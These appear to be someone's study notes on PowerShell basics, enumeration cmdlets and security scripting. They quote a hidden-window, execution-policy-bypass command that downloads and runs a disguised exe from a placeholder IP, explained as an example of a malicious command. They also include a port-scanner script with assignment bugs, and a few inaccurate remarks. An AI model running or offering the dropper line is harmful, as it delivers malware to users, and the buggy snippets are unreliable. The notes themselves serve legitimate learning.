https://adamtheautomator.com/psexec/ (look through some of the Invoke-Commands and document later)

What is PowerShell?
- Windows Scripting Language and shell environment using the .NET framework
- Allows PS to execute .NET functions directly from its shell
- Most PS commands, called cmdlets, are written in .NET
- Unlike other scripting languages and shell environments, the output of these cmdlets are objects - making PS somewhat object-oriented
- Objects having:
	- Properties/Data
		- ie Colour, Model, Year (if the object was a car)
	- Methods/Functions
		- ie Drive(), Refuel() (if the object was a car)
- This means that running cmdlets allows you to perform actions on the output object (which makes it convenient to pass output from one cmdlet to another). The normal format of a cmdlet is represented using Verb-Noun
	- ie `Get-Command` 
		- Will list commands
- Common verbs to use include:
	- `Get`
	- `Start`
	- `Stop`
	- `Read`
	- `Write`
	- `New`
	- `Out`
- Some others:
	- `Add`
	- `Set`
	- `Find`
	- `Search`
	- `Invoke`
	- `Ping`
	- `Test`
- Even more:
	- `Clear`
	- `Close`
	- `Copy`
	- `Enter`
	- `Exit`
- On that note refer to:
	- https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.4&viewFallbackFrom=powershell-7

- Basic PowerShell Commands:
	- Cmdlets follow a `verb-noun` naming convention. 
	- `Get-Command`
		- You can use wildcards
			- `Get-Command Verb-*`
			- `Get-Command *-Noun`
			- 
	- `Get-Help`
	- `Get-Help Command-Name`
	- `Get-Help Get-Command -Examples`
	- `Get-Alias` 
		- Will show you a list of alias's that are available to use (ie `cd` is an alias for `Set-Location`, `dir` is an alias for `Get-ChildItem` and so on..)
	- `powershell -c Get-Service`
		- Will get you a list of the services on the machine and their states (running, stopped)
	- `Restart-Service -Name "ServiceName"`
		- Will restart the given service
	- `Stop-Service -Name "ServiceName`
		- Will stop the given service
- Creating a Directory
	- `New-Item -Path ".\something-folder\something-folder-new" -ItemType "Directory"`
- Creating a File
	- `New-Item -Path ".\something-folder\something-folder-new\something-new-in-folder.txt" -ItemType "File"`
- Removing an Item (whether it is a file, or a directory)
	- `Remove-Item -Path ".\something-folder\something-folder-new\something-new-in-folder.txt"`
	- `Remove-Item -Path ".\something-folder\something-folder-new"`
- Copying an Item
	- `Copy-Item -Path .\something-new-infolder.txt -Destination .\something-new-infolder2.txt`
- Moving an item
	- `Move-Item` (same as Copy-Item syntax)
- `Get-Alias` is your friend, remember that :) 

- Object Manipulation
	- If we want to manipulate the output - we'd need to figure out a few things:
		- Passing the output to other cmdlets
		- Using specific object cmdlets to extract information
	- The pipeline character is used to pass output from one cmdlet to another
	- A major difference compared to other shells is that PS passes an object to the next cmdlet instead of passing text or string to the command after the pipe
	- Like every object in object-oriented frameworks, an object will contain methods and properties
	- You can think of **methods** as functions that can be applied to output from the cmdlet
	- You can think of **properties** as variables in the output from a cmdlet
	- To view these details, pass the output of a cmdlet to the `Get-Member` cmdlet
		- `Verb-Noun | Get-Member`
		- ie `Get-Service | Get-Member`
			- Will list all the methods, properties and other "MemberTypes" that categorise the Get-Service cmdlet

- Creating Objects from Previous cmdlets (**piping**)
	- One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object
	- This is done using the `Select-Object` cmdlet
	- ie `Get-ChildItem | Select-Object -Property Mode, Name`
		- `Get-ChildItem`
			- like `dir` or `ls`
			- Properties listed by default are, Mode, LastWriteTime, Length and Name
			- The above command specifies you only want to print Mode and Name -- Try it out

- Filtering Objects
	- When retrieving output objects, you may want to select objects that match a very specific value
	- You can use `Where-Object` to filter based on the value of properties
	- Basic syntax:
		- `Verb-Noun | Where-Object -Property PropertyName -operator Value`
		- the `-operator` is a list of the following operators:
			- `-Contains`
			- `-EQ`
			- `-GT`
		- `Get-ChildItem | Where-Object -Property "Extension" -eq ".txt"`
		- `Get-ChildItem | Sort-Object Length -Descending | Select-Object -First 1`
			- There are more, list here:
				- https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.4&viewFallbackFrom=powershell-6
	- Example: 
		- `Get-ChildItem | Where-Object -Property Name -Contains "Contacts"`
		- Try it out
	- Example, checking stopped processes:
		- `Get-Service | Where-Object -Property Status -eq Stopped`

- Sorting Objects
	- `Sort-Object`
	- Format:
		- `Verb-Noun | Sort-Object`
	- Example:
		- `Get-ChildItem | Sort-Object -Property LastWriteTime`
			- Will arrange the list of directories in descending order..

- Don't forget about the `Get-Help Verb-Noun` command

- Also `Get-Command Verb-*` or `Get-Command *-Noun`

- Getting a count from a list
	- `Measure-Object`
	- Example:
		- `Get-Command | Where-Object -Property CommandType -EQ Cmdlet | Measure-Object`

- Getting a hash of a file
	- `Get-FileHash`
	- `Get-FileHash -Algorithm algorithmType path`
		- Note that you can tab through various operators to see what could be available

- Getting the PWD
	- `Get-Location`

- Searching for a file
	- `$filename = filename.txt`
	- `Get-ChildItem -Path C:\ -Filter $filename -Recurse | % {$_.FullName}`
	- `Get-ChildItem -Path C:\ -Recurse "*filename*"`
- Searching for content within a file
	- `Get-ChildItem -Path 'C:\directory name' -Recurse | Select-String "STRING_TO_FIND"`

- Searching for text within a file
	- `Select-String` (kind of like grep)
	- `Select-String -Path ".\sometextfile.txt" -Pattern "something in the file!"`
		- Will return which line in the file that bit of text was found, if found
	- Fully supports regex

- Getting System and Network Information 
	- `Get-ComputerInfo`
		- Returns a very comprehensive list of system information
		- Remember this gets pulled as an object - so you'd be able to filter whatever you'd needed relatively quickly if you knew wtf you were doing
- Enumeration
	- Users
		- `Get-LocalUser`
		- `Get-LocalUser | Measure-Object`
			- Not sure why you'd want to do that but I was mucking around
		- `Get-LocalGroup`
		- Needing to find out how to see if passwords are disabled for users or not
	- Basic networking information
		- `Get-NetIPConfiguration`
		- `Get-NetIPAddress`
		- `Get-NetTCPConnection`
			- Will show you ports
		- Example:
			- `Get-NetTCPConnection | Where-Object -Property State -EQ Listen`
			- `Get-NetTCPConnection -State Listen`
	- File permissions
		- Finding out who the owner of a file/directory is:
			- `Get-ChildItem | Get-Acl`
	- Registry permissions
	- Scheduled and running tasks
		- `Get-ScheduledTask`
			- Will list scheduled tasks on the machine
		- Get-Scheduled 
	- Insecure files
	- Patches installed
		- `Get-Hotfix`
	- List running Processes
		- `Get-Process`
	- List Services
		- Get-Service
	- `Test-NetConnection`
		- `Test-NetConnection localhost -Port 1`
		- Could write a script that loops between two ranges and prints out the results from above, or adds the findings to a list
		- Test and see what is output'd from the above and see how to pull that into a separate txt file or something

- Checking the hash of a file
	- `CertUtil -hashfile <file-name> SHA256`
- Comparing two strings together:
	- `<"string-1">.Equals("string-2")`
		- Will return a boolean value

- Potential Malicious Parameters
	```powershell
	"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } �PassThru; Invoke-WebRequest -Uri ""http://<pubic-ip-address>/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
	```
	- `-WindowStyle`
		- This parameter allows one to control how the PowerShell window appears when executing a script or command
		- `-WindowStyle hidden`
			- Will mean that the PowerShell window will not be visible to the user of the machine where the command is running from.
	- `-executionpolicy bypass`
		- Means that the execution policy (which allows one to override this policy) is ignored, allowing any script to run without restriction
	- `Invoke-WebRequest`
		- Commonly used for downloading files from the Internet
	- `Uri`
		- Specifies the URL of the web resource one is wanting to retrieve
	- `-OutFile`
		- Specifies the local file where the downloaded content will be saved (here it will be saved to $TempFile)
	- `Start-Process`
		- Executes the downloaded file that is stored in `$TempFile`
	
- Basic Scripting
	- Scripting would allow for the automation of various tasks, essentially allowing for efficiency
	- Log analysis, anomaly detection, pulling Indicators of Compromise (IoCs)
	- Can also be used to reverse-engineer malware or to automate the scanning of systems for any unwanted access aka intrusion
	- Scripts can also allow for system enumeration if pentesting, executing remote commands, crafting obfuscated scripts to bypass regular system defenses
	- With PowerShell and the multi-OS world we live in, and PowerShell's ability to speak with those various OSes, scripting with PowerShell can be real powerful
	- PS Scripts can be used to:
		- Enforce security policies
		- Monitor system(s) health
		- Automatic response to incidents
		- And more
	- The `Invoke-Command`
		- Used for running/executing commands on remote systems
		- Remote management
		- Automation of tasks across multiple devices
		- Can be used to execute payloads or commands on remote systems
	- https://learnxinyminutes.com/docs/powershell/
	- Tool: Powershell ISE
	```PowerShell
	$system_ports = Get-NetTCPConnection -State Listen
	$text_port = Get-Content -Path C:\Users\User1\Desktop\ports.txt
	foreach($port in $text_port){
		if($port -in $system_ports.LocalPort){
			echo $port
			}
	}
	```
	- Sometimes tools like NMAP or Python may not be available
	- Tasks such as determining IP ranges to scan, port ranges to scan, type of scan to be run will need to be carried out manually

- Port Scanner Script Example (kudos to Rich - however I would do this differently, or this can be done differently)
```Powershell
	$ErrorActionPreference -eq "SilentlyContinue"
	$Target -eq "localhost"
	$LowEnd = 1
	$HighEnd = 65535
	$X = 0
	Do
	{
	    $CurrentPort = $LowEnd + $X
	    if((Test-NetConnection -ErrorAction SilentlyContinue $Target -Port $CurrentPort).PingSucceeded -or (Test-NetConnection -ErrorAction SilentlyContinue $Target -Port $CurrentPort).TcpTestSucceeded)
	    {
	        $CurrentPort | Out-File .\OpenPorts.txt -Append
	    }
	    $X = $X + 1
	}
	While($CurrentPort -lt $HighEnd)
	
	(Get-Content .\OpenPorts.txt).Count
```